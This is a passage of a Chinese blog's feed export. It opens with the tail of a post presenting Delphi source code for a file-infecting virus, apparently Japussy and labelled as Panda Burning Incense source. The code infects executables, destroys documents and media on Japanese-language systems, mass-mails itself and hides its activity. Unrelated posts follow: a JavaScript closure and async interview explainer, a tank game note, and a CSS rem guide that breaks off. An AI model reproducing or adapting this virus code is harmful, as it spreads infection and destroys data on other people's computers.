&apos;:&apos;;</span><br><span class="line">DiskType := GetDriveType(PChar(Str));</span><br><span class="line">//得到本地磁盘和网络盘</span><br><span class="line">if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then</span><br><span class="line">Result := Result + D;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历目录，感染和摧毁文件 &#125;</span><br><span class="line">procedure LoopFiles(Path, Mask: string);</span><br><span class="line">var</span><br><span class="line">i, Count: Integer;</span><br><span class="line">Fn, Ext: string;</span><br><span class="line">SubDir: TStrings;</span><br><span class="line">SearchRec: TSearchRec;</span><br><span class="line">Msg: TMsg;</span><br><span class="line">function IsValidDir(SearchRec: TSearchRec): Integer;</span><br><span class="line">begin</span><br><span class="line">if (SearchRec.Attr &lt;&gt; 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 0 //不是目录</span><br><span class="line">else if (SearchRec.Attr = 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 1 //不是根目录</span><br><span class="line">else Result := 2; //是根目录</span><br><span class="line">end;</span><br><span class="line">begin</span><br><span class="line">if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑</span><br><span class="line">if IsValidDir(SearchRec) = 0 then</span><br><span class="line">begin</span><br><span class="line">Fn := Path + SearchRec.Name;</span><br><span class="line">Ext := UpperCase(ExtractFileExt(Fn));</span><br><span class="line">if (Ext = &apos;.EXE&apos;) or (Ext = &apos;.SCR&apos;) then</span><br><span class="line">begin</span><br><span class="line">InfectOneFile(Fn); //感染可执行文件</span><br><span class="line">end</span><br><span class="line">else if (Ext = &apos;.HTM&apos;) or (Ext = &apos;.HTML&apos;) or (Ext = &apos;.ASP&apos;) then</span><br><span class="line">begin</span><br><span class="line">//感染HTML和ASP文件，将Base64编码后的病毒写入</span><br><span class="line">//感染浏览此网页的所有用户</span><br><span class="line">//哪位大兄弟愿意完成之？</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.WAB&apos; then //Outlook地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Outlook邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.ADC&apos; then //Foxmail地址自动完成文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;IND&apos; then //Foxmail地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else</span><br><span class="line">begin</span><br><span class="line">if IsJap then //是倭文操作系统</span><br><span class="line">begin</span><br><span class="line">if (Ext = &apos;.DOC&apos;) or (Ext = &apos;.XLS&apos;) or (Ext = &apos;.MDB&apos;) or</span><br><span class="line">(Ext = &apos;.MP3&apos;) or (Ext = &apos;.RM&apos;) or (Ext = &apos;.RA&apos;) or</span><br><span class="line">(Ext = &apos;.WMA&apos;) or (Ext = &apos;.ZIP&apos;) or (Ext = &apos;.RAR&apos;) or</span><br><span class="line">(Ext = &apos;.MPEG&apos;) or (Ext = &apos;.ASF&apos;) or (Ext = &apos;.JPG&apos;) or</span><br><span class="line">(Ext = &apos;.JPEG&apos;) or (Ext = &apos;.GIF&apos;) or (Ext = &apos;.SWF&apos;) or</span><br><span class="line">(Ext = &apos;.PDF&apos;) or (Ext = &apos;.CHM&apos;) or (Ext = &apos;.AVI&apos;) then</span><br><span class="line">SmashFile(Fn); //摧毁文件</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">//感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑</span><br><span class="line">Sleep(200);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">SubDir := TStringList.Create;</span><br><span class="line">if (FindFirst(Path + &apos;*.*&apos;, faDirectory, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">if IsValidDir(SearchRec) = 1 then</span><br><span class="line">SubDir.Add(SearchRec.Name);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">Count := SubDir.Count - 1;</span><br><span class="line">for i := 0 to Count do</span><br><span class="line">LoopFiles(Path + SubDir.Strings + &apos;&apos;, Mask);</span><br><span class="line">FreeAndNil(SubDir);</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历磁盘上所有的文件 &#125;</span><br><span class="line">procedure InfectFiles;</span><br><span class="line"> </span><br><span class="line">var</span><br><span class="line">DriverList: string;</span><br><span class="line">i, Len: Integer;</span><br><span class="line">begin</span><br><span class="line">if GetACP = 932 then //日文操作系统</span><br><span class="line">IsJap := True; //去死吧！</span><br><span class="line">DriverList := GetDrives; //得到可写的磁盘列表</span><br><span class="line">Len := Length(DriverList);</span><br><span class="line">while True do //死循环</span><br><span class="line">begin</span><br><span class="line">for i := Len downto 1 do //遍历每个磁盘驱动器</span><br><span class="line">LoopFiles(DriverList + &apos;:&apos;, &apos;*.*&apos;); //感染之</span><br><span class="line">SendMail; //发带毒邮件</span><br><span class="line">Sleep(1000 * 60 * 5); //睡眠5分钟</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 主程序开始 &#125;</span><br><span class="line">begin</span><br><span class="line">if IsWin9x then //是Win9x</span><br><span class="line">RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程</span><br><span class="line">else //WinNT</span><br><span class="line">begin</span><br><span class="line">//远程线程映射到Explorer进程</span><br><span class="line">//哪位兄台愿意完成之？</span><br><span class="line">end;</span><br><span class="line">//如果是原始病毒体自己</span><br><span class="line">if CompareText(ExtractFileName(ParamStr(0)), &apos;Japussy.exe&apos;) = 0 then</span><br><span class="line">InfectFiles //感染和发邮件</span><br><span class="line">else //已寄生于宿主程序上了，开始工作</span><br><span class="line">begin</span><br><span class="line">TmpFile := ParamStr(0); //创建临时文件</span><br><span class="line">Delete(TmpFile, Length(TmpFile) - 4, 4);</span><br><span class="line">TmpFile := TmpFile + #32 + &apos;.exe&apos;; //真正的宿主文件，多一个空格</span><br><span class="line">ExtractFile(TmpFile); //分离之</span><br><span class="line">FillStartupInfo(Si, SW_SHOWDEFAULT);</span><br><span class="line">CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,</span><br><span class="line">0, nil, &apos;.&apos;, Si, Pi); //创建新进程运行之</span><br><span class="line">InfectFiles; //感染和发邮件</span><br><span class="line">end;</span><br><span class="line">end.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;熊猫烧香源码&quot;&gt;&lt;a href=&quot;#熊猫烧香源码&quot; class=&quot;headerlink&quot; title=&quot;熊猫烧香源码&quot;&gt;&lt;/a&gt;熊猫烧香源码&lt;/h3&gt;&lt;hr&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/80%25%E5%BA%94%E8%81%98%E8%80%85%E9%83%BD%E4%B8%8D%E5%8F%8A%E6%A0%BC%E7%9A%84JS%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://yoursite.com/2018/03/05/80%应聘者都不及格的JS面试题/</id>
    <published>2018-03-05T06:23:53.993Z</published>
    <updated>2018-03-05T06:27:04.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="不起眼的开始"><a href="#不起眼的开始" class="headerlink" title="不起眼的开始"></a>不起眼的开始</h1><p>招聘前端工程师，尤其是中高级前端工程师，扎实的 JS 基础绝对是必要条件，基础不扎实的工程师在面对前端开发中的各种问题时大概率会束手无策。在考察候选人 JS 基础的时候，我经常会提供下面这段代码，然后让候选人分析它实际运行的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(new Date, i);</span><br></pre></td></tr></table></figure><a id="more"></a><p>这段代码很短，只有 7 行，我想，能读到这里的同学应该不需要我逐行解释这段代码在做什么吧。候选人面对这段代码时给出的结果也不尽相同，以下是典型的答案：</p><ol><li>20% 的人会快速扫描代码，然后给出结果：0,1,2,3,4,5；</li><li>30% 的人会拿着代码逐行看，然后给出结果：5,0,1,2,3,4；</li><li>50% 的人会拿着代码仔细琢磨，然后给出结果：5,5,5,5,5,5；</li></ol><p>只要你对 JS 中同步和异步代码的区别、变量作用域、闭包等概念有正确的理解，就知道正确答案是 C，代码的实际输出是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017-03-18T00:43:45.873Z 5</span><br><span class="line">2017-03-18T00:43:46.866Z 5</span><br><span class="line">2017-03-18T00:43:46.868Z 5</span><br><span class="line">2017-03-18T00:43:46.868Z 5</span><br><span class="line">2017-03-18T00:43:46.868Z 5</span><br><span class="line">2017-03-18T00:43:46.868Z 5</span><br></pre></td></tr></table></figure><p>接下来我会追问：如果我们约定，用箭头表示其前后的两次输出之间有 1 秒的时间间隔，而逗号表示其前后的两次输出之间的时间间隔可以忽略，代码实际运行的结果该如何描述？会有下面两种答案：</p><ol><li>60% 的人会描述为：5 -&gt; 5 -&gt; 5 -&gt; 5 -&gt; 5，即每个 5 之间都有 1 秒的时间间隔；</li><li>40% 的人会描述为：5 -&gt; 5,5,5,5,5，即第 1 个 5 直接输出，1 秒之后，输出 5 个 5；</li></ol><p>这就要求候选人对 JS 中的定时器工作机制非常熟悉，循环执行过程中，几乎同时设置了 5 个定时器，一般情况下，这些定时器都会在 1 秒之后触发，而循环完的输出是立即执行的，显而易见，正确的描述是 B。</p><p>如果到这里算是及格的话，100 个人参加面试只有 20 人能及格，读到这里的同学可以仔细思考，你及格了么？</p><hr><h2 id="追问-1：闭包"><a href="#追问-1：闭包" class="headerlink" title="追问 1：闭包"></a>追问 1：闭包</h2><p>如果这道题仅仅是考察候选人对 JS 异步代码、变量作用域的理解，局限性未免太大，接下来我会追问，如果期望代码的输出变成：5 -&gt; 0,1,2,3,4，该怎么改造代码？熟悉闭包的同学很快能给出下面的解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    (function(j) &#123;  // j = i</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">            console.log(new Date, j);</span><br><span class="line">        &#125;, 1000);</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(new Date, i);</span><br></pre></td></tr></table></figure><p>巧妙的利用 IIFE（Immediately Invoked Function Expression：声明即执行的函数表达式）来解决闭包造成的问题，确实是不错的思路，但是初学者可能并不觉得这样的代码很好懂，至少笔者初入门的时候这里琢磨了一会儿才真正理解。</p><p>有没有更符合直觉的做法？答案是有，我们只需要对循环体稍做手脚，让负责输出的那段代码能拿到每次循环的 i 值即可。该怎么做呢？利用 JS 中基本类型（Primitive Type）的参数传递是按值传递（Pass by Value）的特征，不难改造出下面的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var output = function (i) &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    output(i);  // 这里传过去的 i 值被复制了</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(new Date, i);</span><br></pre></td></tr></table></figure></p><p>能给出上述 2 种解决方案的候选人可以认为对 JS 基础的理解和运用是不错的，可以各加 10 分。当然实际面试中还有候选人给出如下的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (let i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(new Date, i);</span><br></pre></td></tr></table></figure></p><p>细心的同学会发现，这里只有个非常细微的变动，即使用 ES6 块级作用域（Block Scope）中的 let 替代了 var，但是代码在实际运行时会报错，因为最后那个输出使用的 i 在其所在的作用域中并不存在，i 只存在于循环内部。</p><p>能想到 ES6 特性的同学虽然没有答对，但是展示了自己对 ES6 的了解，可以加 5 分，继续进行下面的追问。</p><hr><h2 id="追问-2：ES6"><a href="#追问-2：ES6" class="headerlink" title="追问 2：ES6"></a>追问 2：ES6</h2><p>有经验的前端同学读到这里可能有些不耐烦了，扯了这么多，都是他知道的内容，先别着急，挑战的难度会继续增加。</p><p>接着上文继续追问：如果期望代码的输出变成 0 -&gt; 1 -&gt; 2 -&gt; 3 -&gt; 4 -&gt; 5，并且要求原有的代码块中的循环和两处 console.log 不变，该怎么改造代码？新的需求可以精确的描述为：代码执行时，立即输出 0，之后每隔 1 秒依次输出 1,2,3,4，循环结束后在大概第 5 秒的时候输出 5（这里使用大概，是为了避免钻牛角尖的同学陷进去，因为 JS 中的定时器触发时机有可能是不确定的</p><p>看到这里，部分同学会给出下面的可行解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    (function(j) &#123;</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">            console.log(new Date, j);</span><br><span class="line">        &#125;, 1000 * j));  // 这里修改 0~4 的定时器时间</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123; // 这里增加定时器，超时设置为 5 秒</span><br><span class="line">    console.log(new Date, i);</span><br><span class="line">&#125;, 1000 * i);</span><br></pre></td></tr></table></figure></p><p>不得不承认，这种做法虽粗暴有效，但是不算是能额外加分的方案。如果把这次的需求抽象为：在系列异步操作完成（每次循环都产生了 1 个异步操作）之后，再做其他的事情，代码该怎么组织？聪明的你是不是想起了什么？对，就是 Promise。</p><p>可能有的同学会问，不就是在控制台输出几个数字么？至于这样杀鸡用牛刀？你要知道，面试官真正想考察的是候选人是否具备某种能力和素质，因为在现代的前端开发中，处理异步的代码随处可见，熟悉和掌握异步操作的流程控制是成为合格开发者的基本功。</p><p>顺着下来，不难给出基于 Promise 的解决方案（既然 Promise 是 ES6 中的新特性，我们的新代码使用 ES6 编写是不是会更好？如果你这么写了，大概率会让面试官心生好感）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const tasks = [];</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;   // 这里 i 的声明不能改成 let，如果要改该怎么做？</span><br><span class="line">    ((j) =&gt; &#123;</span><br><span class="line">        tasks.push(new Promise((resolve) =&gt; &#123;</span><br><span class="line">            setTimeout(() =&gt; &#123;</span><br><span class="line">                console.log(new Date, j);</span><br><span class="line">                resolve();  // 这里一定要 resolve，否则代码不会按预期 work</span><br><span class="line">            &#125;, 1000 * j);   // 定时器的超时时间逐步增加</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Promise.all(tasks).then(() =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;, 1000);   // 注意这里只需要把超时设置为 1 秒</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>相比而言，笔者更倾向于下面这样看起来更简洁的代码，要知道编程风格也是很多面试官重点考察的点，代码阅读时的颗粒度更小，模块化更好，无疑会是加分点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const tasks = []; // 这里存放异步操作的 Promise</span><br><span class="line">const output = (i) =&gt; new Promise((resolve) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;, 1000 * i);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 生成全部的异步操作</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    tasks.push(output(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 异步操作完成之后，输出最后的 i</span><br><span class="line">Promise.all(tasks).then(() =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>读到这里的同学，恭喜你，你下次面试遇到类似的问题，至少能拿到 80 分。</p><p>我们都知道使用 Promise 处理异步代码比回调机制让代码可读性更高，但是使用 Promise 的问题也很明显，即如果没有处理 Promise 的 reject，会导致错误被丢进黑洞，好在新版的 Chrome 和 Node 7.x 能对未处理的异常给出 Unhandled Rejection Warning，而排查这些错误还需要一些特别的技巧（浏览器、Node.js）。</p><hr><h2 id="追问-3：ES7"><a href="#追问-3：ES7" class="headerlink" title="追问 3：ES7"></a>追问 3：ES7</h2><p>既然你都看到这里了，那就再坚持 2 分钟，接下来的内容会让你明白你的坚持是值得的。</p><p>多数面试官在决定聘用某个候选人之前还需要考察另外一项重要能力，即技术自驱力，直白的说就是候选人像有内部的马达在驱动他，用漂亮的方式解决工程领域的问题，不断的跟随业务和技术变得越来越牛逼，究竟什么是牛逼？建议阅读程序人生的这篇剖析。</p><p>回到正题，既然 Promise 已经被拿下，如何使用 ES7 中的 async await 特性来让这段代码变的更简洁？你是否能够根据自己目前掌握的知识给出答案？请在这里暂停 1 分钟，思考下。</p><p>下面是笔者给出的参考代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 模拟其他语言中的 sleep，实际上可以是任何异步操作</span><br><span class="line">const sleep = (timeountMS) =&gt; new Promise((resolve) =&gt; &#123;</span><br><span class="line">    setTimeout(resolve, timeountMS);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">(async () =&gt; &#123;  // 声明即执行的 async 函数表达式</span><br><span class="line">    for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">        await sleep(1000);</span><br><span class="line">        console.log(new Date, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    await sleep(1000);</span><br><span class="line">    console.log(new Date, i);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢你花时间读到这里，相信你收获的不仅仅是用 JS 精确控制代码输出的各种技巧，更是对于前端工程师的成长期许：扎实的语言基础、与时俱进的能力、强大技术自驱力。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;不起眼的开始&quot;&gt;&lt;a href=&quot;#不起眼的开始&quot; class=&quot;headerlink&quot; title=&quot;不起眼的开始&quot;&gt;&lt;/a&gt;不起眼的开始&lt;/h1&gt;&lt;p&gt;招聘前端工程师，尤其是中高级前端工程师，扎实的 JS 基础绝对是必要条件，基础不扎实的工程师在面对前端开发中的各种问题时大概率会束手无策。在考察候选人 JS 基础的时候，我经常会提供下面这段代码，然后让候选人分析它实际运行的结果：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for (var i = 0; i &amp;lt; 5; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setTimeout(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        console.log(new Date, i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;, 1000);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(new Date, i);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/"/>
    <id>http://yoursite.com/2018/03/05/坦克大战游戏/</id>
    <published>2018-03-05T06:23:38.176Z</published>
    <updated>2018-03-05T06:26:24.017Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="坦克大战"><a href="#坦克大战" class="headerlink" title="坦克大战"></a>坦克大战</h1><p>游戏道具<br>五星标志为增强坦克的火力的道具，连吃3个的话能达到坦克的最高火力等级，就可以摧毁以前不能摧毁的钢筋水泥了。<br>秒表道具：全屏敌人静止不动停留数秒。<br>炸弹道具：全屏敌人遭到爆炸攻击，全数炸毁灭。<br>坦克道具：奖励玩家一辆坦克。</p><hr><a id="more"></a><h2 id="试玩地址"><a href="#试玩地址" class="headerlink" title="试玩地址"></a>试玩地址</h2><p><a href="http://pathblogs.com/game/tank" target="_blank" rel="noopener"><code>点我前往</code></a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;坦克大战&quot;&gt;&lt;a href=&quot;#坦克大战&quot; class=&quot;headerlink&quot; title=&quot;坦克大战&quot;&gt;&lt;/a&gt;坦克大战&lt;/h1&gt;&lt;p&gt;游戏道具&lt;br&gt;五星标志为增强坦克的火力的道具，连吃3个的话能达到坦克的最高火力等级，就可以摧毁以前不能摧毁的钢筋水泥了。&lt;br&gt;秒表道具：全屏敌人静止不动停留数秒。&lt;br&gt;炸弹道具：全屏敌人遭到爆炸攻击，全数炸毁灭。&lt;br&gt;坦克道具：奖励玩家一辆坦克。&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/%E7%BC%96%E8%BE%91REM%E5%B0%8F%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/03/05/编辑REM小解/</id>
    <published>2018-03-05T06:23:09.063Z</published>
    <updated>2018-03-05T06:26:02.213Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="什么叫做rem"><a href="#什么叫做rem" class="headerlink" title="什么叫做rem"></a>什么叫做rem</h1><p>REM是相对单位，是相对HTML根元素。<br>这个单位可谓集相对大小和绝对大小的优点于一身，通过它既可以做到只修改根元素就成比例地调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。<br>目前，除了IE8及更早版本外，所有浏览器均已支持rem。</p><hr><a id="more"></a><h1 id="使用rem之前做的准备"><a href="#使用rem之前做的准备" class="headerlink" title="使用rem之前做的准备"></a>使用rem之前做的准备</h1><h3 id="css进行一个初始化"><a href="#css进行一个初始化" class="headerlink" title="css进行一个初始化"></a>css进行一个初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*移动端适配 width|height|font-size = 视觉稿量出来的值 / 100rem;*/</span><br><span class="line">@media screen and (max-width:359px) and (min-width:320px) &#123;</span><br><span class="line">    html,body&#123;</span><br><span class="line">        font-size: 50px !important;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media screen and (max-width:374px) and (min-width:360px) &#123;</span><br><span class="line">    html,body&#123;</span><br><span class="line">        font-size: 56.25px !important;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media screen and (max-width:413px) and (min-width:375px) &#123;</span><br><span class="line">   html,body&#123;</span><br><span class="line">        font-size: 58.5px !important;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media screen and (max-width:639px)  and (min-width:414px)&#123;</span><br><span class="line">   html,body&#123;</span><br><span class="line">        font-size: 64.6px !important;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;@media screen and (min-width:640px) &#123;</span><br><span class="line">   html,body&#123;</span><br><span class="line">        font-size: 100px !important;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="然后在针对页面的宽度进行换算"><a href="#然后在针对页面的宽度进行换算" class="headerlink" title="然后在针对页面的宽度进行换算"></a>然后在针对页面的宽度进行换算<figure class="highlight plain"><figcaption><span>###</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 